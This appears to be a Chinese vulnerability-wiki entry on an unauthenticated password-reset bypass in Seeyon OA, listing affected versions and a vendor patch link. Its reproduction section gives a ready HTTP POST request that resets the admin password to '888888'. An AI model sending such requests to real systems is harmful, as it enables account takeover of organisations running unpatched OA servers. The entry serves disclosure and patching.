# 致远 OA 未授权短信验证码绕过重置密码漏洞

## 漏洞描述

致远互联专注于企业级管理软件领域，是一家集产品的设计、研发、销售及服务为一体高新技术企业。致远 Seeyon OA 存在短信验证码绕过重置密码漏洞，攻击者可以利用该漏洞修改任意用户密码。

参考链接：

- https://service.seeyon.com/patchtools/tp.html#/patchList?type=%E5%AE%89%E5%85%A8%E8%A1%A5%E4%B8%81&id=171

## 披露时间

```
2023.08
```

## 漏洞影响

```
V5-G6、V8.1-SP2、V8.2
```

## 漏洞复现

```
POST /seeyon/rest/phoneLogin/phoneCode/resetPassword HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Content-Length: 45
Connection: close

{"loginName":"admin”,”password":"888888"}
```

## 漏洞修复

目前厂商已发布升级补丁以修复漏洞，补丁获取链接：

https://service.seeyon.com/patchtools/tp.html#/patchList?type=%E5%AE%89%E5%85%A8%E8%A1%A5%E4%B8%81&id=171
